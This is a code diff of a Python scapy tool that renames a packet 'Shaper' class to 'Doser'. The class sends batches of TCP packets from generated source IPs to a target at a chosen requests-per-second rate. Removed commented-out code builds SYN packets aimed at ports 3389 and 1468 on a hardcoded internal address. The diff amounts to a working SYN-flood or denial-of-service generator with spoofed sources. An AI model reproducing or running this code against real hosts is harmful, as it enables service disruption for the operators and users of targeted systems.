@@ -17,7 +17,7 @@ def print_w_pid(line):
     print('[{}] {}'.format(current_process().ident, line))
 
 
-class Shaper(object):
+class Doser(object):
     def __init__(self, ip_generator, dst, dport, verbose):
         self.buffer = []
         self.pkt_counter = 0
@@ -25,15 +25,14 @@ class Shaper(object):
         self.ip_generator = ip_generator
         self.dst = dst
         self.dport = int(dport)
-        self.pkt = None
         self.time_last_insertion = time.time()
         self.verbose = verbose
         self.avg_rps_counter = 0
 
-    def fill_buffer(self, rps, counter, profile):
+    def run(self, rps, profile):
         while True:
-            print_w_pid('Filling buffer ...')
-            print_w_pid('Selected profile: %s' % profile)
+            # print_w_pid('Filling buffer ...')
+            # print_w_pid('Selected profile: %s' % profile)
             while rps != len(self.buffer):
                 # Define IP headers
                 ip_h = scapy.IP()
@@ -48,8 +47,8 @@ class Shaper(object):
                     # Assemble the network package
                     pkt = ip_h / tcp_h
                     self.buffer.append(pkt)
-            counter, self.time_last_insertion, self.avg_rps_counter = \
-                self._send_batch(self.buffer, counter, self.time_last_insertion, self.avg_rps_counter)
+            self.sent_counter, self.time_last_insertion, self.avg_rps_counter = \
+                self._send_batch(self.buffer, self.sent_counter, self.time_last_insertion, self.avg_rps_counter)
             self.buffer[:] = []
 
     def _send_batch(self, buffer, sent_counter, time_last_insertion, avg_rps_counter):
@@ -133,39 +132,8 @@ class Worker(Process):
         self._start()
 
     def _start(self):
-        shaper_buffer = Shaper(self.ip_gen(), self.kwargs['dst'], self.kwargs['dport'], self.kwargs['verbose'])
-        shaper_buffer.fill_buffer(self.kwargs['rps'], 0, self.kwargs['profile'])
-        # [print_w_pid(_.summary()) for _ in got_buffer]
-
-    # def _start(self):
-    #     # Define Ether headers
-    #     # ether_h = scapy.Ether()
-    #
-    #     # Define IP headers
-    #     ip_h = scapy.IP()
-    #     ip_h.src = self.get_ip()
-    #     ip_h.dst = '10.206.255.122'
-    #
-    #     # Define TCP headers
-    #     tcp_h = scapy.TCP()
-    #     tcp_h.sport = scapy.RandShort()
-    #     tcp_h.dport = [3389, 1468]
-    #     tcp_h.flags = 'S'
-    #
-    #     # Define ICMP headers
-    #     # icmp_h = scapy.ICMP()
-    #     # icmp_h.id = '0x6003'
-    #
-    #     # Assemble the packet
-    #     pkt = ip_h/tcp_h
-    #     # pkt = ip_h/icmp_h/"XXXXXXXXXXX"
-    #
-    #     print_w_pid(pkt.summary())
-    #
-    #     # Sending packages ...
-    #     scapy.send(pkt, verbos=0)
-    #     # ans, unans = scapy.sr(pkt)
-    #     # ans.summary()
+        worker_doser = Doser(self.ip_gen(), self.kwargs['dst'], self.kwargs['dport'], self.kwargs['verbose'])
+        worker_doser.run(self.kwargs['rps'], self.kwargs['profile'])
 
     @staticmethod
     def ip_gen():
